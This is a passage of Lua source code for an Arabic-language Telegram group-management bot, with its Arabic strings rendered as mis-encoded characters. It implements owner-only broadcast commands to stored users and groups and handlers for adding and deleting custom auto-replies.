local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงุฐุงุนู ุฎุงุต" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "โข ุงุฐุงุนู ุฎุงุต โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
DevRio:setex(Rinda.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุงุฑุณู ูู ุณูุงุก โขโฏ\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก ) \n โ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Rinda.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุถูุนู", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Rinda..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
RioText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "ุงูููุฏูู"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุฐุงุนุฉ "..RioText.." ุถูุนู \nโ๏ธฐโุงูู โข โจ "..#List.." โฉ ูุดุชุฑู \n โ", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงุฐุงุนู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "โข ุงุฐุงุนู ุนุงู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
DevRio:setex(Rinda.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุงุฑุณู ูู ุณูุงุก โขโฏ\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก ) \n โ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Rinda.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุถูุนู", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Rinda..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
RioText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "ุงูููุฏูู"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุฐุงุนุฉ "..RioText.." ุถูุนู \nโ๏ธฐโูู โข โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงุฐุงุนู ุจุงูุชูุฌูู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "โข ุงุฐุงุนู ุนุงู ุจุงูุชูุฌูู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
DevRio:setex(Rinda.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุงุฑุณู ุงูุฑุณุงูู ุงูุงู ูุชูุฌููุง \nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก ) \n โ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Rinda.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุถูุนู", 1, 'md')
DevRio:del(Rinda.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Rinda..'Rio:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธฐโูู โข โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
DevRio:del(Rinda.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "โข ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
DevRio:setex(Rinda.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุงุฑุณู ุงูุฑุณุงูู ุงูุงู ูุชูุฌููุง \nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก ) \n โ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Rinda.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุถูุนู", 1, 'md')
DevRio:del(Rinda.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Rinda..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธฐโุงูู โข โจ "..#List.." โฉ ูุดุชุฑู \n โ", 1, 'md')
DevRio:del(Rinda.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงุฐุงุนู ุจุงูุชุซุจูุช" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "โข ุงุฐุงุนู ุจุงูุชุซุจูุช โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
DevRio:setex(Rinda.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุงุฑุณู ูู ุณูุงุก โขโฏ\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก ) \n โ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Rinda.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "ุงูุบุงุก" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุถูุนู", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(Rinda.."Rio:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
RioText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "ุงูููุฏูู"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(Rinda..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุฐุงุนุฉ "..RioText.." ุจุงูุชุซุจูุช \nโ๏ธฐโูู โข โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
DevRio:del(Rinda.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุญุฐู ุฑุฏ ูู ูุชุนุฏุฏ' or text == 'ูุณุญ ุฑุฏ ูู ูุชุนุฏุฏ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
local List = DevRio:smembers(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุชุนุฏุฏู ูุถุงูู" ,  1, "md")
return false
end end
DevRio:set(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ูููุฉ ุงูุฑุฏ ุงููุง" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevRio:sismember(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงููุฌุฏ ุฑุฏ ูุชุนุฏุฏ ููุฐู ุงููููู โข "..text ,  1, "md")
return false
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูู ุจุงุฑุณุงู ุงูุฑุฏ ุงููุชุนุฏุฏ ุงูุฐู ุชุฑูุฏ ุญุฐูู ูู ุงููููู โข "..text ,  1, "md")
DevRio:set(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(Rinda..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text and (text == 'ุญุฐู ุฑุฏ ูุชุนุฏุฏ' or text == 'ูุณุญ ุฑุฏ ูุชุนุฏุฏ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
local List = DevRio:smembers(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุชุนุฏุฏู ูุถุงูู" ,  1, "md")
return false
end end
DevRio:set(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ูุญุฐููุง" ,  1, "md")
return false
end
if text == 'ุงุถู ุฑุฏ ูุชุนุฏุฏ' and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุงุถุงูู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
DevRio:set(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ุงูุงู" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevRio:sismember(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local Rio = "โ๏ธฐูุงุชุณุชุทูุน ุงุถุงูุฉ ุฑุฏ ุจุงูุชุงููุฏ ูุถุงู ูู ุงููุงุฆูู ูู ุจุญุฐูู ุงููุง !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุญุฐู ุงูุฑุฏ โข "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Rio).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevRio:del(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงูุงูุฑ ุงุฑุณู ุงูุฑุฏ ุงูุงูู\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )" ,  1, "md")
DevRio:set(Rinda..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(Rinda..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงุถู ูุช' and ChCheck(msg) then
DevRio:set(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงูุฑ `ูุช ุชููุช` ุงูุงู" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevRio:get(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงูุงูุฑ ุงุฑุณู ุงูุณุคุงู ุงูุงูู\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )" ,  1, "md")
DevRio:set(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevRio:set(Rinda..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Rinda..'Rio:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุญุฐู ุฑุฏ' or text == 'ูุณุญ ุฑุฏ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
return false
end
DevRio:set(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ูุญุฐููุง " ,  1, "md")
return false
end
if text and (text == 'ุงุถู ุฑุฏ' or text == 'ุงุถุงูู ุฑุฏ' or text == 'ุงุถุงูุฉ ุฑุฏ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุงุถุงูู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
DevRio:set(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ุงูุงู " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Text = "โ๏ธฐุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โข โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููููู ุงุถุงูุฉ ุงูู ุงููุต โข โค\n-----------------------------------------\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#msgs` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\n-----------------------------------------\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )\n โ"
DevRio:set(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(Rinda..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Rinda..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(Rinda..'DelManagerRep'..msg.chat_id_,text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุบูุฑ ุงูุฑุฏ โข",callback_data="/ChangeRed:"..msg.sender_user_id_}},{{text="โข ุงูุบุงุก โข",callback_data="/CancelRed:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
